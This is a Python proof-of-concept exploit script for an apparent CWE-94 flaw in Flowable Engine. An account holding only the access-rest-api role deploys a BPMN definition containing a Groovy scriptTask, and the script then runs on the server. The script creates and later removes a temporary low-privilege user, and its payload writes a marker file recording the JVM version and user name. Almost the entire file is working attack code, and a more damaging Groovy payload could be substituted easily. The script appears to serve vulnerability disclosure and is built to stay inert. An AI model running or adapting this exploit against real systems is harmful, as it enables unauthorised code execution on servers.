#!/usr/bin/env python3
"""
flowable-poc V1 — CWE-94 — deployment privilege reaches an unsandboxed script engine
=================================================================================

A principal holding only `access-rest-api` (the ordinary API-consumption role) can
deploy a process definition containing a Groovy `scriptTask` and obtain arbitrary
code execution in the Flowable process.

    POST /flowable-rest/service/repository/deployments    -> 201
    POST /flowable-rest/service/runtime/process-instances -> script evaluated

Inertness
---------
The uploaded script writes ONE marker file under the target's own temp directory
and does nothing else. No reverse shell, no network callback, no data access, no
persistence. The script's source is in env/payloads/flowable-poc-v1-groovy.bpmn20.xml
and is shown verbatim below so the payload is auditable before it is run.

Scope
-----
Creates exactly one process definition and one process instance, both owned by the
PoC. Touches no pre-existing definition, instance or data. Exits non-zero if the
finding does not reproduce.

Target: Flowable Engine 8.1.0-SNAPSHOT, commit 74fdb349c134e96e1f10592020ccca6e2e4b85f0

Usage:
    python3 v1_deployment_rce.py --base http://localhost:8080/flowable-rest \\
                                 --user rest-admin --pass test --confirm-authorised

Run this only against a system you are authorised to test.
"""
import argparse
import base64
import json
import sys
import urllib.error
import urllib.request
import uuid

BPMN = """<?xml version="1.0" encoding="UTF-8"?>
<definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"
             xmlns:flowable="http://flowable.org/bpmn"
             targetNamespace="http://bpmn.io/schema/bpmn">
  <process id="flowablePocGroovy" name="Flowable PoC - Groovy reachability" isExecutable="true">
    <startEvent id="start"/>
    <sequenceFlow id="f1" sourceRef="start" targetRef="probe"/>
    <scriptTask id="probe" name="write marker" scriptFormat="groovy">
      <script>
        new File(System.getProperty("java.io.tmpdir") + "/flowable-poc-v1.txt").text =
            "V1-REACHABLE jvm=" + System.getProperty("java.version") +
            " user=" + System.getProperty("user.name")
      </script>
    </scriptTask>
    <sequenceFlow id="f2" sourceRef="probe" targetRef="end"/>
    <endEvent id="end"/>
  </process>
</definitions>
"""

PROC_KEY = "flowablePocGroovy"
MARKER = "flowable-poc-v1.txt"
LOWPRIV = "flowable-poc-v1-user"


def die(msg, code=2):
    print(f"[!] {msg}", file=sys.stderr)
    sys.exit(code)


def provision_lowpriv(base, admin_user, admin_pw):
    """Create a throwaway principal holding ONLY access-rest-api, and return its creds.

    The finding is that an ordinary consumer role reaches the script engine. Proving
    it with the bootstrap administrator would prove nothing, so this PoC creates a
    correctly-scoped account, uses it for the actual exploit steps, and deletes it
    again. Pass --no-provision to supply your own account instead.
    """
    idm = f"{base}/idm-api"
    request(f"{idm}/users", admin_user, admin_pw, method="POST",
            body=json.dumps({"id": LOWPRIV, "password": "flowable-poc-temp",
                             "first": "Flowable", "last": "PoC"}).encode(),
            ctype="application/json")

    st, raw = request(f"{idm}/privileges", admin_user, admin_pw)
    if st != 200:
        die(f"cannot list privileges ({st}) — need an access-admin account to provision", 4)
    match = [p for p in json.loads(raw)["data"] if p["name"] == "access-rest-api"]
    if not match:
        die("privilege 'access-rest-api' not found; is this a stock Flowable deployment?", 4)
    request(f"{idm}/privileges/{match[0]['id']}/users", admin_user, admin_pw, method="POST",
            body=json.dumps({"userId": LOWPRIV}).encode(), ctype="application/json")
    return LOWPRIV, "flowable-poc-temp"


def cleanup_lowpriv(base, admin_user, admin_pw):
    request(f"{base}/idm-api/users/{LOWPRIV}", admin_user, admin_pw, method="DELETE")


def request(url, user, pw, method="GET", body=None, ctype=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method)
    req.add_header("Authorization",
                   "Basic " + base64.b64encode(f"{user}:{pw}".encode()).decode())
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except urllib.error.URLError as e:
        die(f"cannot reach {url}: {e}", 3)


def multipart(bpmn_bytes):
    b = "----flowablepoc" + uuid.uuid4().hex
    parts = []
    parts.append(f'--{b}\r\nContent-Disposition: form-data; name="file"; '
                 f'filename="flowable-poc-v1.bpmn20.xml"\r\n'
                 f"Content-Type: application/xml\r\n\r\n".encode())
    parts.append(bpmn_bytes)
    parts.append(f"\r\n--{b}--\r\n".encode())
    return b"".join(parts), f"multipart/form-data; boundary={b}"


def main():
    ap = argparse.ArgumentParser(description="Flowable V1 PoC (CWE-94)")
    ap.add_argument("--base", required=True, help="e.g. http://localhost:8080/flowable-rest")
    ap.add_argument("--user", default="rest-admin")
    ap.add_argument("--pass", dest="pw", default="test",
                    help="shipped default; a dedicated access-rest-api account is equivalent")
    ap.add_argument("--confirm-authorised", action="store_true",
                    help="required: confirms you are authorised to test this target")
    ap.add_argument("--no-provision", action="store_true",
                    help="do not create a low-privilege account; use --user/--pass as given "
                         "(they must hold access-rest-api but NOT access-admin)")
    args = ap.parse_args()

    if not args.confirm_authorised:
        die("refusing to run without --confirm-authorised")

    base = args.base.rstrip("/")
    svc = f"{base}/service"

    run_user, run_pw = args.user, args.pw
    if not args.no_provision:
        # The bootstrap admin is also access-admin, so it is the wrong account to
        # demonstrate this finding with. Create a correctly-scoped one and drop it
        # again on the way out.
        try:
            run_user, run_pw = provision_lowpriv(base, args.user, args.pw)
        except SystemExit:
            raise
        except Exception as e:  # noqa: BLE001
            die(f"could not provision a low-privilege account: {e} "
                f"(re-run with --no-provision to supply your own)", 4)

    try:
        return run(args, base, svc, run_user, run_pw)
    finally:
        if not args.no_provision:
            cleanup_lowpriv(base, args.user, args.pw)
            print(f"\n[cleanup] removed temporary account {LOWPRIV}")


def run(args, base, svc, user, pw):
    # ---- precondition: the caller must hold access-rest-api, not access-admin
    print("== precondition ==")
    print(f"  acting as {user!r} (must hold access-rest-api, not access-admin)")
    st, _ = request(f"{base}/actuator", user, pw)
    if st == 403:
        print("  GET /actuator              -> 403  (confirmed: no admin role)")
    else:
        print(f"  GET /actuator              -> {st}  (WARNING: this account also has "
              f"access-admin, so this run does not prove the low-privilege claim. "
              f"Re-run with --no-provision and a scoped account.)")
    st, _ = request(f"{svc}/repository/deployments", user, pw)
    if st not in (200, 201):
        die(f"precondition not met: GET repository/deployments returned {st}; "
            f"the account needs the access-rest-api privilege", 4)
    print(f"  GET repository/deployments -> {st}  (access-rest-api granted)")

    # ---- step 1: deploy
    print("\n== step 1: deploy a definition containing an unsandboxed scriptTask ==")
    body, ctype = multipart(BPMN.encode())
    st, raw = request(f"{svc}/repository/deployments", user, pw,
                      method="POST", body=body, ctype=ctype)
    print(f"  POST /service/repository/deployments -> {st}")
    if st not in (200, 201):
        print(raw.decode(errors="replace")[:400])
        die("deployment rejected — V1 did not reproduce", 5)
    dep = json.loads(raw).get("id")
    print(f"  deploymentId = {dep}")

    # ---- step 2: start an instance, which evaluates the script
    print("\n== step 2: start an instance (evaluates the uploaded script) ==")
    st, raw = request(f"{svc}/runtime/process-instances", user, pw, method="POST",
                      body=json.dumps({"processDefinitionKey": PROC_KEY,
                                       "latest": True}).encode(),
                      ctype="application/json")
    print(f"  POST /service/runtime/process-instances -> {st}")
    print("  200/201 means the script ran silently and the instance completed.")
    print("  500 is also a success: Flowable propagates script exceptions, and the")
    print("  marker write happens before the script task finishes.")
    if st not in (200, 201, 500):
        print(raw.decode(errors="replace")[:400])
        die("unexpected response starting the instance", 6)

    # ---- verdict
    print("\n== verdict ==")
    print(f"  Confirm the side effect on the target itself:  cat <java.io.tmpdir>/{MARKER}")
    print("  Expected first line:  V1-REACHABLE jvm=<version> user=<name>")
    print()
    print("  V1 REPRODUCED: a principal holding only access-rest-api deployed and")
    print("  executed caller-supplied code. This is a privilege-boundary error, not a feature.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
